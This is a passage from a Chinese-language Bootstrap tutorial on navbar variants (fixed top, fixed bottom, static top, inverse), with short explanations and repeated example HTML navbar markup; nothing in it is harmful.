class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-form navbar-right&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span><br>                向右对齐-提交按钮<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-text navbar-right&quot;</span>&gt;</span>向右对齐-文本<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-8-固定到顶部"><a href="#2-8-固定到顶部" class="headerlink" title="2.8 固定到顶部"></a>2.8 固定到顶部</h3><p>在 <code>.navbar</code> 中添加 <code>.navbar-fixed-top</code> 类可以让导航条固定在顶部，还可包含一个 <code>.container</code> 或 <code>.container-fluid</code> 容器，从而让导航条居中，并在两侧添加内补（padding）。</p><p>为了防止导航栏与页面主体中的其他内容的顶部相交错，请向 <body> 标签添加至少 50 像素的内边距（padding），内边距的值可以根据需要进行设置。</p><p>需要为 body 元素设置内补（padding）。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default navbar-fixed-top&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                    Java <span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jmeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Jasper Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-9-固定到底部"><a href="#2-9-固定到底部" class="headerlink" title="2.9 固定到底部"></a>2.9 固定到底部</h3><p>向 <code>.navbar class</code> 中添加 <code>.navbar-fixed-bottom</code> 类可以让导航条固定在底部，并且还可以包含一个 <code>.container</code> 或 <code>.container-fluid</code> 容器，从而让导航条居中，并在两侧添加内补（padding）。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default navbar-fixed-bottom&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                    Java <span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jmeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Jasper Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-10-静态的顶部"><a href="#2-10-静态的顶部" class="headerlink" title="2.10 静态的顶部"></a>2.10 静态的顶部</h3><p>创建能随着页面一起滚动的导航栏，请添加 <strong>.navbar-static-top</strong> class。该 class 不要求向 <body> 添加内边距（padding）。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default navbar-static-top&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                    Java <span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jmeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Jasper Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-11-反色的导航栏"><a href="#2-11-反色的导航栏" class="headerlink" title="2.11 反色的导航栏"></a>2.11 反色的导航栏</h3><p>通过添加 <code>.navbar-inverse</code> 类可以改变导航条的外观。创建一个带有黑色背景白色文本的反色的导航栏。为了防止导航栏与页面主体中的其他内容的顶部相交错，请向 <body> 标签添加至少 50 像素的内边距（padding），内边距的值可以根据需要进行设置。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-inverse&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                    Java <span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jmeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Jasper Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span 